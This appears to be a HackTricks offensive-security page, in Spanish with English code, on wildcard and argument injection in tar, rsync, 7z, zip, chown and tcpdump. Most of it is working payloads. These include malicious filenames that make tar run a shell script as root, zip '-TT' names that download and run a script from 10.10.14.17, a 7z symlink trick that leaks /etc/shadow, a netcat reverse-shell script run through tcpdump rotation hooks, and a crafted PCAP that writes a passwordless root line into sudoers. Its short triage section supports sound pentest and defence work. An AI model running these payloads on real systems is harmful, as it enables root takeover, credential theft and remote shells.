# Trucos adicionales con Wildcards

{{#include ../../banners/hacktricks-training.md}}

> La **argument injection** con Wildcards (también llamados *globs*) ocurre cuando un script privilegiado ejecuta un binario de Unix como `tar`, `chown`, `rsync`, `zip`, `7z`, … con un wildcard sin comillas como `*`.
> Como el shell expande el wildcard **antes** de ejecutar el binario, un atacante que pueda crear archivos en el directorio de trabajo puede crear nombres de archivo que comiencen por `-`, haciendo que se interpreten como **opciones en lugar de datos** y permitiendo introducir flags arbitrarios o incluso comandos.
> Esta página recopila las primitivas más útiles, investigaciones recientes y detecciones modernas para 2023-2025.

## chown / chmod

Puedes **copiar el propietario/grupo o los bits de permisos de un archivo arbitrario** abusando del flag `--reference`:
```bash
# attacker-controlled directory
touch "--reference=/root/secret``file"   # ← filename becomes an argument
```
Cuando root ejecuta posteriormente algo como:
```bash
chown -R alice:alice *.php
chmod -R 644 *.php
```
`--reference=/root/secret``file` is injected, causing *all* matching files to inherit the ownership/permissions of `/root/secret``file`.

*PoC & tool*: [`wildpwn`](https://github.com/localh0t/wildpwn) (ataque combinado).
Consulta también el clásico paper de DefenseCode para más detalles.<sup>[[6]](#references)</sup>

---

## tar

### GNU tar (Linux, *BSD, busybox-full)

Ejecuta comandos arbitrarios abusando de la funcionalidad de **checkpoint**:
```bash
# attacker-controlled directory
echo 'echo pwned > /tmp/pwn' > shell.sh
chmod +x shell.sh
touch "--checkpoint=1"
touch "--checkpoint-action=exec=sh shell.sh"
```
Una vez que root ejecuta, por ejemplo, `tar -czf /root/backup.tgz *`, `shell.sh` se ejecuta como root.

### bsdtar / macOS 14+

El `tar` predeterminado en versiones recientes de macOS (basado en `libarchive`) no implementa `--checkpoint`, pero aún puedes lograr code-execution con el flag **--use-compress-program**, que permite especificar un compresor externo.
```bash
# macOS example
touch "--use-compress-program=/bin/sh"
```
Cuando un script con privilegios ejecuta `tar -cf backup.tar *`, se iniciará `/bin/sh`.

---

## rsync

`rsync` permite sobrescribir el remote shell o incluso el remote binary mediante flags de línea de comandos que comienzan por `-e` o `--rsync-path`:
```bash
# attacker-controlled directory
touch "-e sh shell.sh"        # -e <cmd> => use <cmd> instead of ssh
```
Si root archiva posteriormente el directorio con `rsync -az * backup:/srv/`, el flag inyectado ejecuta tu shell en el lado remoto.

*PoC*: [`wildpwn`](https://github.com/localh0t/wildpwn) (modo `rsync`).

---

## 7-Zip / 7z / 7za

Incluso cuando el script privilegiado antepone *defensivamente* `--` al wildcard (para detener el análisis de opciones), el formato de 7-Zip admite **archivos de listas de archivos** anteponiendo `@` al nombre del archivo. Al combinar esto con un symlink, puedes *exfiltrar archivos arbitrarios*:
```bash
# directory writable by low-priv user
cd /path/controlled
ln -s /etc/shadow   root.txt      # file we want to read
touch @root.txt                  # tells 7z to use root.txt as file list
```
Si root ejecuta algo como:
```bash
7za a /backup/`date +%F`.7z -t7z -snl -- *
```
7-Zip intentará leer `root.txt` (→ `/etc/shadow`) como una lista de archivos y abortará, **imprimiendo el contenido en stderr**.

Esto sobrevive a `-- *` porque la CLI de 7-Zip acepta explícitamente tanto nombres de archivo normales como `@listfiles` como entradas posicionales, por lo que un nombre de archivo literal como `@root.txt` aún recibe un tratamiento especial.

---

## zip

Existen dos primitives muy prácticas cuando una aplicación pasa nombres de archivo controlados por el usuario a `zip` (ya sea mediante un wildcard o enumerando nombres sin `--`).<sup>[[2]](#references)[[3]](#references)</sup>

- RCE mediante un test hook: `-T` habilita “test archive” y `-TT <cmd>` reemplaza el tester por un programa arbitrario (forma larga: `--unzip-command <cmd>`). Si puedes inyectar nombres de archivo que empiecen por `-`, divide los flags entre distintos nombres de archivo para que funcione el parsing de short-options:
```bash
# Attacker-controlled filenames (e.g., in an upload directory)
# 1) A file literally named: -T
# 2) A file named: -TT wget 10.10.14.17 -O s.sh; bash s.sh; echo x
# 3) Any benign file to include (e.g., data.pcap)
# When the privileged code runs: zip out.zip <files...>
# zip will execute: wget 10.10.14.17 -O s.sh; bash s.sh; echo x
```
Notas
- NO intentes usar un único nombre de archivo como `'-T -TT <cmd>'` — las opciones cortas se analizan carácter por carácter y fallará. Usa tokens separados como se muestra.
- Si la aplicación elimina las barras diagonales de los nombres de archivo, realiza la descarga desde un host/IP sin ruta (la ruta predeterminada es `/index.html`) y guárdala localmente con `-O`; después, ejecútala.
- Puedes depurar el análisis con `-sc` (muestra los argumentos procesados) o `-h2` (más ayuda) para entender cómo se consumen tus tokens.

Ejemplo (comportamiento local en zip 3.0):
```bash
zip test.zip -T '-TT wget 10.10.14.17/shell.sh' test.pcap    # fails to parse
zip test.zip -T '-TT wget 10.10.14.17 -O s.sh; bash s.sh' test.pcap  # runs wget + bash
```
- Exfiltración de datos/leak: Si la capa web devuelve la salida stdout/stderr de `zip` (algo común con wrappers ingenuos), flags inyectados como `--help` o los errores provocados por opciones incorrectas aparecerán en la respuesta HTTP, confirmando la inyección de línea de comandos y ayudando a ajustar el payload.

---

## Binaries adicionales vulnerables a wildcard injection (lista rápida de 2023-2025)

Los siguientes comandos han sido abusados en CTFs modernos y entornos reales. El payload siempre se crea como un *filename* dentro de un directorio con permisos de escritura que posteriormente se procesará con un wildcard:

| Binary | Flag to abuse | Effect |
| --- | --- | --- |
| `bsdtar` | `--newer-mtime=@<epoch>` → arbitrary `@file` | Leer el contenido de un archivo |
| `flock` | `-c <cmd>` | Ejecutar un comando |
| `git`   | `-c core.sshCommand=<cmd>` | Ejecución de comandos mediante git over SSH |
| `scp`   | `-S <cmd>` | Iniciar un programa arbitrario en lugar de ssh |

Estas primitivas son menos comunes que las clásicas de *tar/rsync/zip*, pero vale la pena comprobarlas durante la búsqueda.

---

## Búsqueda de wrappers y jobs vulnerables

Casos recientes han demostrado que wildcard/argv injection ya no es solamente un problema de **cron + tar**.<sup>[[5]](#references)</sup> La misma clase de bug sigue apareciendo en:

- funcionalidades web que "descargan todo como zip/tar" desde directorios de uploads controlados por el atacante
- debug shells de vendors/appliances que exponen un wrapper de **tcpdump** con campos de filename/filter controlados por el atacante
- jobs de backup o rotación que ejecutan `tar`, `rsync`, `7z`, `zip`, `chown` o `chmod` en directorios con permisos de escritura

Comandos útiles para el triage:
```bash
# Hunt for interesting binaries fed with globs or positional user data
rg -n --hidden --follow \
'(tar|bsdtar|rsync|zip|7z|7za|chown|chmod|tcpdump).*(\*|\$@|\$\*)' \
/etc /opt /usr/local /srv 2>/dev/null

# Watch real argv during cron/systemd execution
pspy64 -pf -i 1000 | rg 'tar|rsync|zip|7z|tcpdump|chown|chmod'

# Sudoers rules that constrain one argument but still allow extra flags
sudo -l
rg -n 'tcpdump|zip|tar|rsync' /etc/sudoers /etc/sudoers.d 2>/dev/null
```
Heurísticas rápidas:

- `-- *` es una buena solución para muchas herramientas GNU, pero **no** para `7z`/`7za` porque `@listfiles` se analizan por separado.
- Para `zip`, busca wrappers que enumeren directamente filenames controlados por el usuario; la división de short-options (`-T` + `-TT <cmd>`) sigue funcionando incluso sin un shell glob.
- Para `tcpdump`, presta especial atención a los wrappers que permiten controlar **output file names**, **rotation settings** o los argumentos de **capture-file replay**.

---

## tcpdump rotation hooks (-G/-W/-z): RCE mediante argv injection en wrappers

Cuando un restricted shell o un wrapper de un proveedor construye una línea de comandos de `tcpdump` concatenando campos controlados por el usuario (por ejemplo, un parámetro de "file name") sin aplicar un quoting/validación estrictos, puedes introducir flags adicionales de `tcpdump`. La combinación de `-G` (rotación basada en tiempo), `-W` (limitar el número de archivos) y `-z <cmd>` (comando posterior a la rotación) permite ejecutar comandos arbitrarios como el usuario que ejecuta tcpdump (a menudo root en appliances).<sup>[[1]](#references)[[4]](#references)</sup>

Prerequisites:

- Puedes influir en el `argv` pasado a `tcpdump` (por ejemplo, mediante un wrapper como `/debug/tcpdump --filter=... --file-name=<HERE>`).
- El wrapper no sanitiza los espacios ni los tokens que empiezan por `-` en el campo de file name.

PoC clásica (ejecuta un reverse shell script desde un path con permisos de escritura):
```sh
# Reverse shell payload saved on the device (e.g., USB, tmpfs)
cat > /mnt/disk1_1/rce.sh <<'EOF'
#!/bin/sh
rm -f /tmp/f; mknod /tmp/f p; cat /tmp/f|/bin/sh -i 2>&1|nc 192.0.2.10 4444 >/tmp/f
EOF
chmod +x /mnt/disk1_1/rce.sh

# Inject additional tcpdump flags via the unsafe "file name" field
/debug/tcpdump --filter="udp port 1234" \
--file-name="test -i any -W 1 -G 1 -z /mnt/disk1_1/rce.sh"

# On the attacker host
nc -6 -lvnp 4444 &
# Then send any packet that matches the BPF to force a rotation
printf x | nc -u -6 [victim_ipv6] 1234
```
Detalles:

- `-G 1 -W 1` fuerza una rotación inmediata después del primer paquete coincidente.
- `-z <cmd>` ejecuta el comando posterior a la rotación una vez por rotación. Muchas builds ejecutan `<cmd> <savefile>`. Si `<cmd>` es un script/interpreter, asegúrate de que el manejo de argumentos coincida con tu payload.

Variantes sin medios extraíbles:

- Si tienes cualquier otra primitive para escribir archivos (por ejemplo, un command wrapper independiente que permita la redirección de salida), coloca tu script en una ruta conocida y ejecuta `-z /bin/sh /path/script.sh` o `-z /path/script.sh`, según la semántica de la plataforma.
- Algunos vendor wrappers rotan hacia ubicaciones controlables por el atacante. Si puedes influir en la ruta rotada (symlink/directory traversal), puedes dirigir `-z` para que ejecute contenido que controles completamente sin medios externos.

---

## sudoers: tcpdump con wildcards/args adicionales → arbitrary write/read y root

Anti-pattern muy común en sudoers:<sup>[[3]](#references)</sup>
```text
(ALL : ALL) NOPASSWD: /usr/bin/tcpdump -c10 -w/var/cache/captures/*/<GUID-PATTERN> -F/var/cache/captures/filter.<GUID-PATTERN>
```
Problemas
- El glob `*` y los patrones permisivos solo restringen el primer argumento de `-w`. `tcpdump` acepta varias opciones `-w`; prevalece la última.
- La regla no fija otras opciones, por lo que se permiten `-Z`, `-r`, `-V`, etc.

Primitivas
- Sobrescribir la ruta de destino con un segundo `-w` (el primero solo satisface sudoers):
```bash
sudo tcpdump -c10 -w/var/cache/captures/a/ \
-w /dev/shm/out.pcap \
-F /var/cache/captures/filter.aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa
```
- Path traversal dentro del primer `-w` para escapar del árbol restringido:
```bash
sudo tcpdump -c10 \
-w/var/cache/captures/a/../../../../dev/shm/out \
-F/var/cache/captures/filter.aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa
```
- Fuerza la propiedad de los archivos de salida con `-Z root` (crea archivos propiedad de root en cualquier ubicación):
```bash
sudo tcpdump -c10 -w/var/cache/captures/a/ -Z root \
-w /dev/shm/root-owned \
-F /var/cache/captures/filter.aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa
```
- Escritura de contenido arbitrario reproduciendo un PCAP preparado mediante `-r` (por ejemplo, para añadir una línea a sudoers):

<details>
<summary>Crear un PCAP que contenga el payload ASCII exacto y escribirlo como root</summary>
```bash
# On attacker box: craft a UDP packet stream that carries the target line
printf '\n\nfritz ALL=(ALL:ALL) NOPASSWD: ALL\n' > sudoers
sudo tcpdump -w sudoers.pcap -c10 -i lo -A udp port 9001 &
cat sudoers | nc -u 127.0.0.1 9001; kill %1

# On victim (sudoers rule allows tcpdump as above)
sudo tcpdump -c10 -w/var/cache/captures/a/ -Z root \
-r sudoers.pcap -w /etc/sudoers.d/1111-aaaa \
-F /var/cache/captures/filter.aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa
```
- Lectura arbitraria de archivos/leak de secretos con `-V <file>` (interpreta una lista de savefiles). Los diagnósticos de error suelen repetir las líneas, filtrando el contenido:
```bash
sudo tcpdump -c10 -w/var/cache/captures/a/ -V /root/root.txt \
-w /tmp/dummy \
-F /var/cache/captures/filter.aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa
```
---

## Referencias

- [1] [GTFOBins - tcpdump](https://gtfobins.github.io/gtfobins/tcpdump/)
- [2] [GTFOBins - zip](https://gtfobins.github.io/gtfobins/zip/)
- [3] [0xdf - HTB Dump: Inyección de argumentos de zip a RCE + privesc mediante una configuración incorrecta de sudo en tcpdump](https://0xdf.gitlab.io/2025/11/04/htb-dump.html)
- [4] [FiberGateway GR241AG - Cadena de exploit completa](https://r0ny.net/FiberGateway-GR241AG-Full-Exploit-Chain/)
- [5] [Elastic - Potencial Shell detectado mediante inyección de comodines](https://www.elastic.co/guide/en/security/current/prebuilt-rule-8-19-20-potential-shell-via-wildcard-injection-detected.html)
- [6] [Regreso al futuro: los comodines de Unix descontrolados (DefenseCode)](https://www.exploit-db.com/papers/33930)

{{#include ../../banners/hacktricks-training.md}}
